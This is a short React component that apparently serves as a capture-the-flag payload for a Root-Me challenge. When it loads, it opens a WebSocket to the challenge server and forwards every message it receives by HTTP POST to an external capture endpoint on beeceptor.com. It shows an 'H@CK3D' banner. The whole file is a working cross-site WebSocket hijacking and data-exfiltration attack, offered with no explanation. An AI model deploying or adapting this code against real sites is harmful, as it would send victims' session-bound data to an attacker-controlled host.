import { useEffect } from "react";

const WebSocketTest = () => {
    useEffect(() => {
        var connection = new WebSocket('ws://ctf03.root-me.org/ws');
        connection.onopen = function () {
            connection.send('Hello')
        }
        connection.onmessage = function (message) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "http://victorgirault.free.beeceptor.com/");
            xhr.send(message.data);
        }
    }, []);

    return (<h1>H@CK3D by Victor</h1>)
}

export default WebSocketTest;